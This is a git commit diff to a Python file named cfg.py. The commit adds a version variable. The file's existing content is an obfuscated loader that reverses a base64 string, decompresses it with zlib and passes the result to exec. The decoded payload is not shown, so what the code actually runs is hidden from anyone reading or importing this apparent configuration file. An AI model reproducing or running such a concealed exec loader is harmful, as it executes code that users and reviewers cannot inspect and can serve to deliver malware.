12431fc237044cbb292260af53ef9ab07ced56e8
Joel Silva <53149347+zoreu@users.noreply.github.com>
2023-06-21 21:39:58 -0300

    Update cfg.py

--- cfg.py
+++ cfg.py
@@ -1,1 +1,2 @@
+version_cfg = 1.0
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'3bhoZAABUfdVKdvKqwKyqKvzPBtDM4KN2zASt6wKzxgCs+KSuYPDKDTMtgk919sDLbDcL2sNUrCL3xCcOTdCxcnUIR91ICt1NhUrLxJe'))
